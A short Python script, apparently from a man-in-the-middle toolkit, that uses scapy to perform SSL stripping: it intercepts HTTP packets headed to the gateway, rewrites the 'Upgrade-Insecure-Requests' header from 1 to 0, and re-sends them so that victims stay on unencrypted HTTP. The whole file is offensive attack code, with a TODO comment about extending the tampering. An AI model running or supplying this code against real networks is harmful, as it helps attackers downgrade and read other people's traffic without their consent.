from scapy.all import Ether, TCP, Raw, sendp
from networking import *

def ssl_strip(packet):
    try:
        gateway_ip = get_default_gateway_ip()
        gateway_mac = get_mac_address(gateway_ip)

        if TCP in packet and packet[TCP].dport == 80 and "Upgrade-Insecure-Requests" in str(packet[Raw].load) and packet[Ether].dst == gateway_mac:
            decoded_prl = packet[Raw].load.decode()
            new_prl = decoded_prl.replace("Upgrade-Insecure-Requests: 1", "Upgrade-Insecure-Requests: 0")

            new_prl_encoded = new_prl.encode()
            packet[Raw].load = new_prl_encoded

            print("Raw_Packet", packet[Raw].load)

            try:
                sendp(packet, iface="eth0")
            except:
                print("Failed to send packet...")

        # ? TODO If SRC == default_gateway then replace ack 0 with 1?

    except:
        pass